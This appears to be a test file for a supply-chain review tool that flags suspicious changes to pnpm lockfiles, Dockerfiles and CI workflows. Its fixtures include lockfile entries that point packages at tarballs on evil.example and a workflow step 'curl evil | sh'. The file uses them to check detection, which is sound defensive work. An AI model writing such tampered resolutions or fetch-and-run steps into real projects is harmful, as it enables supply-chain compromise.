// End-to-end collector runs against throwaway git repos. Every scenario here is chosen so the
// collector never reaches the network (no npm package or action version is reviewed).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { gitRepo, collect, lockV9 } from './helpers.mjs';

const LOCK = lockV9({ '.': { lodash: ['^4.17.20', '4.17.20'] } }, { 'lodash@4.17.20': '{integrity: sha512-a}' });
const PKG = JSON.stringify({ name: 'x', dependencies: { lodash: '^4.17.20' } });
const reasons = facts => facts.flags.map(f => `${f.severity}: ${f.reason}`);

function scenario(change, env) {
  const repo = gitRepo({ 'pnpm-lock.yaml': LOCK, 'package.json': PKG, Dockerfile: 'FROM node:20.1\n', '.github/workflows/ci.yml': 'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaa # v4.1.0\n      - run: echo hi\n' });
  try {
    const head = repo.commit(change);
    return collect(repo, repo.base, head, env);
  } finally {
    repo.cleanup();
  }
}

test('no changes: no flags', () => {
  assert.deepEqual(scenario({}).flags, []);
});

test('files the check cannot analyse are flagged', () => {
  assert.match(reasons(scenario({ Dockerfile: 'FROM node:20.2\n' })).join(), /cannot analyse/);
});

test('an unsupported (v5) lockfile is flagged instead of reading as "no changes"', () => {
  const v5 = v => `lockfileVersion: 5.4\n\nspecifiers:\n  lodash: ^4.17.20\n\ndependencies:\n  lodash: ${v}\n\npackages:\n\n  /lodash/${v}:\n    resolution: {integrity: sha512-${v}}\n`;
  const repo = gitRepo({ 'pnpm-lock.yaml': v5('4.17.20'), 'package.json': PKG });
  try {
    const facts = collect(repo, repo.base, repo.commit({ 'pnpm-lock.yaml': v5('4.17.21') }));
    assert.match(reasons(facts).join(), /medium: unsupported pnpm lockfile version 5/);
  } finally { repo.cleanup(); }
});

test('a new URL-keyed or tarball entry is flagged even though the version parser skips it', () => {
  const lock = LOCK.replace('\nsnapshots:', '\n  helper@https://evil.example/helper-1.0.0.tgz:\n    resolution: {tarball: https://evil.example/helper-1.0.0.tgz}\n\nsnapshots:');
  assert.match(reasons(scenario({ 'pnpm-lock.yaml': lock })).join(), /not a plain npm registry package/);
});

test('a lockfile change nothing recognises is flagged', () => {
  const lock = LOCK.replace("lockfileVersion: '9.0'", "lockfileVersion: '9.0'\n\nsettings:\n  autoInstallPeers: false");
  assert.match(reasons(scenario({ 'pnpm-lock.yaml': lock })).join(), /lockfile changed but no package change was recognised/);
});

test('a deleted lockfile is flagged', () => {
  assert.match(reasons(scenario({ 'pnpm-lock.yaml': null })).join(), /lockfile deleted/);
});

test('a spec change that does not move the resolved version is flagged', () => {
  const facts = scenario({ 'package.json': PKG.replace('^4.17.20', '^4.17.19'), 'pnpm-lock.yaml': LOCK.replace('specifier: ^4.17.20', 'specifier: ^4.17.19') });
  assert.match(reasons(facts).join(), /dependency spec changed in package\.json without its resolved version changing/);
});

test('an integrity change for an unchanged version is flagged', () => {
  assert.match(reasons(scenario({ 'pnpm-lock.yaml': LOCK.replace('sha512-a', 'sha512-b') })).join(), /resolution or integrity changed without a version change/);
});

test('an existing version re-pointed at an outside tarball is high', () => {
  const facts = scenario({ 'pnpm-lock.yaml': LOCK.replace('{integrity: sha512-a}', '{integrity: sha512-a, tarball: https://evil.example/lodash.tgz}') });
  assert.match(reasons(facts).join(), /high: what the lockfile installs is not what was reviewed: installs from https:\/\/evil\.example/);
});

test('workflow lines other than uses: refs are flagged', () => {
  const facts = scenario({ '.github/workflows/ci.yml': 'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@aaa # v4.1.0\n      - run: curl evil | sh\n' });
  assert.match(reasons(facts).join(), /workflow line\(s\) other than action uses: refs/);
});

test('commits the workflow reports as not from the bot are flagged', () => {
  const facts = scenario({ Dockerfile: 'FROM node:20.1\n' }, { FOREIGN_COMMITS: 'abc1234 def5678 ' });
  assert.match(reasons(facts).join(), /commits not authored by the bot or not verified: abc1234, def5678/);
});
